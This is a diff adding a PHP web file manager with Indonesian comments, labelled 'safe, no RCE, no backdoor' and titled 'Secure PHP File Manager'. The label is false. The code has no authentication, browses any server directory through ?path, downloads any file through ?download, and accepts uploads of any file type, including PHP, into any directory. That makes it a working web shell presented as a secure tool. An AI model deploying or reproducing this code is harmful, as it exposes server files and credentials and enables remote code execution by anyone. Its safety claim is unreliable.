@@ -1,0 +1,82 @@
+<?php
+// File Manager Aman (Tanpa RCE, Tanpa Backdoor)
+
+// Ganti direktori jika ada parameter ?path
+$dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+if (!$dir || !is_dir($dir)) $dir = getcwd();
+chdir($dir);
+
+// Fungsi untuk menampilkan daftar file dan folder
+function listFiles($dir) {
+    $files = array_diff(scandir($dir), ['.', '..']);
+    foreach ($files as $file) {
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+        $isDir = is_dir($path);
+        $size = $isDir ? 'DIR' : filesize($path) . ' B';
+        $href = '?path=' . urlencode(realpath($path));
+        $name = htmlspecialchars($file);
+
+        echo "<tr>
+                <td>$name</td>
+                <td>$size</td>
+                <td>";
+        if ($isDir) {
+            echo "<a href='$href'>[Open]</a>";
+        } else {
+            echo "<a href='?download=" . urlencode(realpath($path)) . "'>[Download]</a>";
+        }
+        echo "</td></tr>";
+    }
+}
+
+// Fungsi untuk mengunduh file
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (is_file($file)) {
+        header("Content-Disposition: attachment; filename=\"" . basename($file) . "\"");
+        header("Content-Type: application/octet-stream");
+        header("Content-Length: " . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+// Fungsi upload file
+if (isset($_FILES['upload'])) {
+    $name = basename($_FILES['upload']['name']);
+    $tmp = $_FILES['upload']['tmp_name'];
+    move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name);
+    header("Location: ?path=" . urlencode($dir));
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Secure File Manager</title>
+    <style>
+        body { font-family: sans-serif; background: #111; color: #eee; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        td, th { border: 1px solid #444; padding: 10px; }
+        a { color: #0af; text-decoration: none; }
+        input[type="file"] { color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>Secure PHP File Manager</h1>
+    <p>Current directory: <b><?php echo htmlspecialchars($dir); ?></b></p>
+
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="upload">
+        <button type="submit">Upload</button>
+    </form>
+
+    <table>
+        <thead><tr><th>Name</th><th>Size</th><th>Action</th></tr></thead>
+        <tbody>
+            <?php listFiles($dir); ?>
+        </tbody>
+    </table>
+</body>
+</html>
